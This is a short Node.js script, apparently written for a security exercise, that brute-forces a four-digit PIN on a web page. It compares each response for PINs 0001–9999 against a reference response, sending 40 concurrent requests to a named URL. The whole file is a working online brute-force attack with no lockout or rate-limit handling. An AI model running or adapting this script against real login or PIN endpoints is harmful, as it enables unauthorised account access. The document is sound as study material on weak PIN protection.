#!/usr/bin/env node
'use strict';

console.log('Hello world !');

////////////////////////////////////////////////////////////

const fetch = require('node-fetch')
const async = require('async')

const ADDRESS = 'http://raphaelwa.ch/secfail'
//const ADDRESS = 'http://10.1.38.74'

////////////////////////////////////////////////////////////

let reference

fetchReference()
.then(bruteForce)
.then( // catch all
	() => console.log('* all done.'),
	err => console.error('* final error :', err)
)

function fetchReference() {
	return fetch(ADDRESS + '/index.php?pincode=0000')
		.then(res => {
			reference = res
			return res.text()
		})
		.then(text => {
			reference.text = text
			console.log(`* reference response stored: ${reference.ok} / ${reference.status} / ${reference.text.slice(0, 10)}...`)
		})
}

function bruteForce() {
	const MAX = 10000
	const CONCURRENCY_LEVEL = 40 // experimentally determined
	const pins = []

	// TODO use a generator ;)
	for(let i = 1; i < MAX; ++i) {
		const pin = ('0000' + String(i)).slice(-4)
		pins.push(pin)
	}

	return new Promise((resolve, reject) => {
		async.mapLimit(pins, CONCURRENCY_LEVEL, testPin, (err, results) => {
			if (err)
				return reject(err)
			resolve()
		})
	})
}

let progress = 0
function testPin(pin, callback) {
	return fetch(ADDRESS + '/index.php?pincode=' + pin)
	.then(res => {

		// progress indicator
		progress++
		if (progress % 1000 === 0) console.log(`* ${progress} done...`)

		if (res.ok !== reference.ok)
			throw new Error('!ok for ' + pin + '!')

		if (res.status !== reference.status)
			throw new Error('!status for ' + pin + '!')
		return res.text()
	})
	.then(text => {
		if (text !== reference.text)
			throw new Error('!text for ' + pin + '!')
	})
	.then(
		res => callback(null, pin),
		err => callback(err)
	)
}
